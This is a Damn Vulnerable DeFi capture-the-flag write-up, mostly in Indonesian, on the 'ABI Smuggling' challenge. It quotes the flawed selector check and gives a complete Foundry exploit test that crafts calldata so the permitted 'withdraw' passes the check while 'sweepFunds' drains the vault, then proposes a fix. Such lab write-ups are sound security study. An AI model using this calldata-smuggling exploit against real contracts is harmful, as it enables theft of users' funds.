# Abi smuggle
- related files: 
/home/gevariel/dev/damn-vulnerable-defi/test/abi-smuggling/ABISmuggling.t.sol
- /home/gevariel/dev/damn-vulnerable-defi/src/abi-smuggling/AuthorizedExecutor.sol
- /home/gevariel/dev/damn-vulnerable-defi/src/abi-smuggling/SelfAuthorizedVault.sol

---
### 1. Bug 
validasi izin baca selektor dari posisi calldata yang hardcoded, bukan dari selektor yang beneran dieksekusi → selektor-yang-dicek bisa dipisah dari selektor-yang-dijalanin.


### 2. Where 
/home/gevariel/dev/damn-vulnerable-defi/src/abi-smuggling/AuthorizedExecutor.sol



### 3. Leak reason:
- execute ngecek izin dengan baca selektor dari offset hardcoded (4 + 32*3 = byte 100), sedangkan eksekusi pakai actionData yang di-decode lewat pointer yang dikontrol caller. Dua-duanya baca sumber beda, dan gak ada yang maksa keduanya konsisten. Jadi penyerang susun calldata manual: pajang withdraw (diizinin) pas di byte 100 pakai padding word biar lolos cek, sementara sweepFunds (yang nguras vault) ditaro di tail dan itu yang beneran dieksekusi. Cek liat withdraw → lolos; mesin jalanin sweepFunds → vault kering.

``` solidity
        // Read the 4-bytes selector at the beginning of `actionData`
        bytes4 selector;
        uint256 calldataOffset = 4 + 32 * 3; // calldata position where `actionData` begins
        assembly {
            selector := calldataload(calldataOffset)
        }

        // eksekusi — ikut POINTER yang dikontrol caller
        target.functionCall(actionData);
```

### 4. How we breach:
```
function test_abiSmuggling() public checkSolvedByPlayer {
    // 1. Bungkus senjata asli: calldata sweepFunds(recovery, token).
    //    Ini yang BENERAN mau dieksekusi buat nguras vault.
    bytes memory actionData = abi.encodeWithSelector(
        vault.sweepFunds.selector, recovery, IERC20(address(token))
    );

    // 2. Rakit calldata tangan (abi.encodePacked, bukan encode normal):
    bytes memory payload = abi.encodePacked(
        AuthorizedExecutor.execute.selector,     // KTP execute
        uint256(uint160(address(vault))),        // param target
        uint256(0x80),                           // pointer actionData → digeser ke tail
        uint256(0),                              // padding: ganjel biar withdraw jatuh di byte 100
        bytes32(vault.withdraw.selector),        // withdraw (diizinin) pas di byte 100 → lolos cek
        uint256(actionData.length),              // length actionData
        actionData                               // isi asli = sweepFunds (dieksekusi)
    );

    // 3. Kirim ke vault. Cek izin baca byte 100 = withdraw → lolos.
    //    Eksekusi ikut pointer 0x80 → jalanin sweepFunds → vault kering.
    (bool success, ) = address(vault).call(payload);
    require(success, "call failed");
}
```

### 5. Severity: high - fund lsng ke drain
### 6. Recommendation:
Validasi harus baca selektor dari calldata yang sama dengan yang bakal dieksekusi, bukan dari offset tetap. Caranya: ambil selektor langsung dari actionData (4 byte pertama isi aslinya), bukan dari posisi hardcoded di calldata luar.

``` solidity
// daripada baca dari offset tetap calldata luar:
bytes4 selector = bytes4(actionData[:4]);
```